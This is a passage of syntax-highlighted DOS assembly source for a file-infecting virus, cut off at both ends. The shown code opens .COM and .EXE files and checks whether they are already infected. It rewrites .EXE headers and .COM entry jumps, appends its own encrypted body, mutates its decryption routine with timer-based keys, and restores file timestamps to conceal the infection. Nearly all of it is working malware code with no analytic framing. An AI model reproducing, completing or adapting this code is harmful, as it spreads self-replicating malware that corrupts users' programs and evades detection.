         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">                    </span><span class="sc1">;Open file with Read and Write access</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">
         </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">NEED_TO_LEAVE</span><span class="sc0">                </span><span class="sc1">;Quit on error</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">                         </span><span class="sc1">;CS=DS</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">
         </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">;Save handle</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">                      </span><span class="sc1">;Read BUF_LENGTH bytes into CS:BUFFER</span><span class="sc0">
         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">BUFFER</span><span class="sc0">                   </span><span class="sc1">;Offset of buffer</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">BUF_LENGTH</span><span class="sc0">               </span><span class="sc1">;Read 'Em</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">
         </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">LEAVE_AND_CLOSE</span><span class="sc0">              </span><span class="sc1">;Quit on error</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc4">,</span><span class="sc2">5A4DH</span><span class="sc0">         </span><span class="sc1">;Is this an .EXE file?</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">NAIL_EXE</span><span class="sc0">                     </span><span class="sc1">;If so, we gotta do some things</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc1">;This portion handles a .COM infection                                         ;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc5">B</span><span class="sc0">              </span><span class="sc1">;An indentical byte means this .COM is</span><span class="sc0">
         </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc5">B</span><span class="sc0">              </span><span class="sc1">;probably already infected</span><span class="sc0">
         </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">CONTINUE_TO_INFECT</span><span class="sc0">          </span><span class="sc1">;If it isn't, let's get it!</span><span class="sc0">

</span><span class="sc5">LEAVE_AND_CLOSE</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">                      </span><span class="sc1">;Close this file</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">

</span><span class="sc5">LEAVE_WITH_ATTRIBS</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">RESTORE_ATTRIBS</span><span class="sc0">            </span><span class="sc1">;Restore the attributes if needed</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">NEED_TO_LEAVE</span><span class="sc0">

</span><span class="sc5">CONTINUE_TO_INFECT</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc0">        </span><span class="sc1">;Starting at CS:BUFFER</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">                     </span><span class="sc1">;CS=ES</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ORIGINAL_EIGHT</span><span class="sc1">;Where to save original eight bytes to</span><span class="sc0">
         </span><span class="sc6">MOVSW</span><span class="sc0">                       </span><span class="sc1">;Save infected files original eight bytes</span><span class="sc0">
         </span><span class="sc6">MOVSW</span><span class="sc0">

         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">                </span><span class="sc1">;Send RW pointer to end of file</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">
         </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                    </span><span class="sc1">;A non-zero DX means too big of a file</span><span class="sc0">
         </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">LEAVE_AND_CLOSE</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">300</span><span class="sc0">                  </span><span class="sc1">;Don't infect files less than 300 bytes</span><span class="sc0">
         </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">LEAVE_AND_CLOSE</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">64000</span><span class="sc0">                </span><span class="sc1">;Or bigger than 64000</span><span class="sc0">
         </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc5">LEAVE_AND_CLOSE</span><span class="sc0">
         </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;Use the pointer as our jump code</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BUFFER</span><span class="sc4">]</span><span class="sc5">B</span><span class="sc4">,</span><span class="sc2">0E9H</span><span class="sc0">          </span><span class="sc1">;Code for absolute JMP</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;This sets up the .COM so we can tell</span><span class="sc0">
         </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                      </span><span class="sc1">;If it's infected next time we see it</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">ATTACH</span><span class="sc0">            </span><span class="sc1">;Continue past .EXE infector</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc1">;This portion handles infecting all .EXE files                                 ;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc5">NAIL_EXE</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;Offset of IP reg. Is this .EXE infected?</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">LEAVE_AND_CLOSE</span><span class="sc0">         </span><span class="sc1">;Leave if already infected</span><span class="sc0">

</span><span class="sc5">GET_EXE</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;EXE size in 512 byte pages</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0200H</span><span class="sc0">                </span><span class="sc1">;Multiply by 512 to get filesize</span><span class="sc0">
         </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">;Save AX, AX=Filesize low byte</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">;Save DX, DX=Filesize high byte</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">ROR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Size of header in 16 byte paragraphs</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">;AX is new code segment displacement</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Get old IP register</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">OLD_IP</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">;Save it here</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Get old code segment displacement</span><span class="sc0">
         </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">                  </span><span class="sc1">;Add 10 to it</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">OLD_CS_DISP</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">;Save it here</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Get old stack segment</span><span class="sc0">
         </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">                  </span><span class="sc1">;Adjust it for later</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">OLD_SS_DISP</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">;And save it here</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Get stack pointer</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">OLD_SP</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">;And save it here</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">;Restore AX</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">;New code segment</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">;New SS=CS</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc2">0FFFFH</span><span class="sc0">      </span><span class="sc1">;SP = End of viral code</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;New IP register</span><span class="sc0">
         </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BUFFER</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">;Size of file in 512 byte pages</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">                </span><span class="sc1">;Move file pointer</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FUNCTION</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc1">; Attach our viral code to the target file                                     ;</span><span class="sc0">
</span><span class="sc1">; This portion is shared by the .EXE and the .COM infectors to be more         ;</span><span class="sc0">
</span><span class="sc1">; efficient                                                                    ;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">

</span><span class="sc5">ATTACH</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5700H</span><span class="sc0">                </span><span class="sc1">;Get the file time and date</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                     </span><span class="sc1">;And save them for later</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">INFECT</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc2">046CH</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;Get a random encryption key from timer</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">                   </span><span class="sc1">;Save part of it in DL</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">                     </span><span class="sc1">;DS=CS</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">ENC_BYTE</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">             </span><span class="sc1">;Save keys in our code</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">ENC_BYTE_2</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">                     </span><span class="sc1">;CS=ES</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様</span><span class="sc0">
</span><span class="sc1">;This section provides a semi-random encryption code mutation based on our     </span><span class="sc0">
</span><span class="sc1">;encryption keys. Look at each line for a desc. of what it does to the code.   </span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様</span><span class="sc0">
         </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">SKIP_1</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ENC_SWITCH</span><span class="sc4">,</span><span class="sc2">0ABDEH</span><span class="sc0"> </span><span class="sc1">;MOV SI,BP &lt;=&gt; PUSH BP POP SI</span><span class="sc0">
</span><span class="sc5">SKIP_1</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">SKIP_2</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ENC_SWITCH_2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">012H</span><span class="sc0">  </span><span class="sc1">;OR DL,AL &lt;=&gt; XOR AL,DL</span><span class="sc0">
</span><span class="sc5">SKIP_2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">SKIP_4</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ENC_SWITCH_4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">010H</span><span class="sc0">
</span><span class="sc5">SKIP_4</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">SKIP_5</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ENC_SWITCH_5</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">010H</span><span class="sc0">
</span><span class="sc5">SKIP_5</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">SKIP_6</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ENC_SWITCH_1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">08H</span><span class="sc0">
</span><span class="sc5">SKIP_6</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">SKIP_7</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ENC_SWITCH_3</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">08H</span><span class="sc0">
</span><span class="sc5">SKIP_7</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">SKIP_8</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ENC_SWITCH_6</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">08H</span><span class="sc0">
</span><span class="sc5">SKIP_8</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">CURTAIN_OPEN</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">DATA_END</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">LENGTH</span><span class="sc0">
         </span><span class="sc6">REPZ</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
         </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ENCRYPT_US</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                  </span><span class="sc1">;Code for handle write</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">LENGTH</span><span class="sc0">               </span><span class="sc1">;Length of our viral code</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">               </span><span class="sc1">;Write all of virus</span><span class="sc0">

</span><span class="sc5">MAKE_HEADER</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">                 </span><span class="sc1">;Set file pointer to beginning</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                    </span><span class="sc1">;Zero out CX</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                    </span><span class="sc1">;Zero out DX</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                   </span><span class="sc1">;Write to file</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc0">         </span><span class="sc1">;Starting at BUFFER</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">BUF_LENGTH</span><span class="sc0">            </span><span class="sc1">;Write BUF_LENGTH bytes</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc1">; This restores the files original date and time                               ;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">

</span><span class="sc5">RESTORE_TIME</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5701H</span><span class="sc0">                   </span><span class="sc1">;Restore original date and time</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                         </span><span class="sc1">;To what was read in earlier</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">LEAVE_AND_CLOSE</span><span class="sc0">            </span><span class="sc1">;Leave</span><span class="sc0">

</span><span class="sc5">DONE</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">OLD_24_BX</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc0">         </span><span class="sc1">;Move the old INT 24's address</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">OLD_24_ES</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc0">         </span><span class="sc1">;so we can restore it</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2524H</span><span class="sc0">                      </span><span class="sc1">;Restore it</span><span class="sc0">
